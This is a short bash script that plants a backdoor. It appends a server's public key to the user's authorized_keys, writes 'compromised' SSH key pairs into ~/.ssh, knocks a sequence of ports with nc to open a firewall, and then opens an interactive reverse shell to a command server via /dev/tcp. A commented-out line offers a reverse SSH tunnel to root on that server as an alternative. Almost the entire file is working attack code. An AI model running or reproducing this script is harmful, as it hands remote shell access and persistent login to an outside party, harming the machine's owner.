#!/bin/bash

set -u

# Allow server to login to us
mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo "$SERVER_PUBLIC_KEY" >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "Injected server public key."

echo "$COMPROMISED_PUBLIC_KEY" >> ~/.ssh/id_rsa.pub
echo "$COMPROMISED_PRIVATE_KEY" >> ~/.ssh/id_rsa
echo "Injected compromised keys."

chmod 600 ~/.ssh/id_rsa

# Bypass server firewall via knock
for port in $KNOCK_OPEN_TUNNEL; do echo | nc $C_SERVER $port; sleep 0.1; done


# Connect to server reverse shell
echo "Connecting via reverse shell..."
/bin/bash -i >& /dev/tcp/$C_SERVER/$SERVER_TUNNEL_PORT 0>&1

#echo "Connecting via ssh..."
#ssh -N -o StrictHostKeyChecking=accept-new -R $SERVER_TUNNEL_PORT:localhost:8000 root@$C_SERVER
